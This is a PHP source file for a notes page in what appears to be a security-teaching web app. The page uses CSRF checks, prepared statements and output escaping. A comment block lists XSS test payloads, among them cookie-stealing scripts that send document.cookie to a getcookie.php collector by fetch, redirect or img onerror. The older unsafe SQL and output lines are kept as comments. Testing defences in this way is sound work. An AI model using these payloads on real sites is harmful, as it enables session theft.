<?php require_once('bootstrap.php'); ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Notes - Comments</title>
    <style>
        form {
            max-width: 500px;
            margin: 20px 0;
            padding: 20px;
            border: 1px solid #ccc;
            background-color: #f9f9f9;
			text-align: left;
        }
        label {
            font-size: 1.1em;
            margin-bottom: 10px;
            display: inline-block;
        }
        textarea {
            width: 100%;
            height: 150px;
            padding: 10px;
            font-size: 1em;
            border: 1px solid #ccc;
            resize: vertical;
			text-align: left;
        }
        button {
            padding: 10px 20px;
            font-size: 1em;
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }

        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            margin: 0;
            padding: 20px;
        }

        .note {
			width: 510px;
            background-color: #f9f9f9;
            border: 1px solid #ddd;
            padding: 15px;
            margin-bottom: 15px;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }
        .note-content {
            font-size: 1.2em;
            color: #333;
        }
        .note-signature {
            text-align: right;
            font-size: 0.9em;
            color: #666;
            margin-top: 10px;
            font-style: italic;
        }
    </style>
</head>

<?php
// If not logged in redirect to login page
if (!is_logged_in()) {
    header("Location: login.php");
    exit;
}

$username = $_SESSION['username'];

if ($_SERVER["REQUEST_METHOD"] === "POST") {
	csrf_check();
}

// Connect to the database
$conn = db_connect();

// Check if new note is entered and add it
if(isset($_POST['new_note']) && trim($_POST['new_note']) !='') {
	$new_note = trim($_POST["new_note"]);

	/*
	XSS using alert(2)<script>alert(2);</script>
	XSS using string.fromCharCode with ASCII codes<script>alert(String.fromCharCode(88,83,83,32,117,115,105,110,103,32,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101));</script>
	XSS eval of Hex Unicode Escape Sequences<script>eval("\u0061\u006c\u0065\u0072\u0074(\u0022\u0058\u0053\u0053\u0020\u0075\u0073\u0069\u006e\u0067\u0020\u0065\u0076\u0061\u006c\u0022)");</script>
	XSS console cookie<script>console.log(document.cookie);alert(document.cookie);</script>
	XSS steal cookie with fetch
		<script>
		fetch(`https://localhost/passman/xss/getcookie.php?v=`+document.cookie)
		  .then(response => response.text())
		  .then(data => {
			console.log(data);
		  })
		  .catch(error => {
			console.error(`Error fetching data:`, error);
		  });
		</script>
	XSS steal cookie with simpler fetch<script>fetch(`https://localhost/passman/xss/getcookie.php?v=`+document.cookie)</script>
	or<script>fetch(`https://localhost/passman/xss/getcookie.php?v=${document.cookie}`)</script>

	// HAS PROBLEM: XSS steal cookie with href redirection<script>window.location.href=`https://localhost/passman/xss/getcookie.php?v=`+document.cookie;</script>
	// HAS PROBLEM: XSS steal cookie with img on-error<img src=x onerror=this.src=`https://localhost/passman/xss/getcookie.php?v=`+document.cookie;>
	*/

	// Insert new note
	//$sql_query = "INSERT INTO notes (login_user_id,note) VALUES " .
	//			 "((SELECT id FROM login_users WHERE username='{$username}'),('{$new_note}'));";

	//$sql_query = "INSERT INTO notes (login_user_id, note) ".
	//			 "VALUES ((SELECT id FROM login_users WHERE username='{$username}'), '{$new_note}')";

	//echo $sql_query;
	//$result = $conn->query($sql_query);

    $sql_query = "INSERT INTO notes (login_user_id, note) ".
				 "VALUES ((SELECT id FROM login_users WHERE username=?), ?)";
    
    $statement = mysqli_prepare($conn, $sql_query);
    mysqli_stmt_bind_param($statement, 'ss', $username, $new_note);
    mysqli_stmt_execute($statement);
    //$result = mysqli_stmt_get_result($statement);
    mysqli_stmt_close($statement);
	$conn -> close();

	// After processing, redirect to the same page to clear the form
	unset($_POST['new_note']);
	header("Location: " . $_SERVER['PHP_SELF']);
	exit();
}

// Display list of all notes/comments
$sql_query = "SELECT notes.note, login_users.username FROM notes INNER JOIN login_users ON notes.login_user_id=login_users.id;";
//echo $sql_query;
$result = $conn->query($sql_query);

echo "<h3>List of notes/comments</h3>";

if (!empty($result) && $result->num_rows >= 1) {
	while ($row = $result -> fetch_assoc()) {
		echo "<div class='note'>";
		//echo	"<div class='note-content'>" . $row["note"] . "</div>";
		//echo	"<div class='note-signature'> by " . $row["username"] . "</div>";
        //Sanitization against XSS
        echo "<div class='note-content'>" . htmlspecialchars($row["note"]) . "</div>";
        echo "<div class='note-signature'> by " . htmlspecialchars($row["username"]) . "</div>";    
		echo "</div>";
	}

	// Free result set
	$result -> free_result();
} else {
	echo "<p><font color=red>No entries found.</font></p>";
}

$conn -> close();
?>

<body>
	<p/>
	<form method="POST">
		<?php echo csrf_field(); ?>
		<label for="note">Enter your note:</label><br>
        <textarea id="note" name="new_note" placeholder="Write your note here..." required></textarea><br><br>
        <button type="submit">Submit Note</button>
    </form>

    <a href="dashboard.php">Dashboard</a>
	<p/>
    <a href="logout.php">Logout</a>
</body>
</html>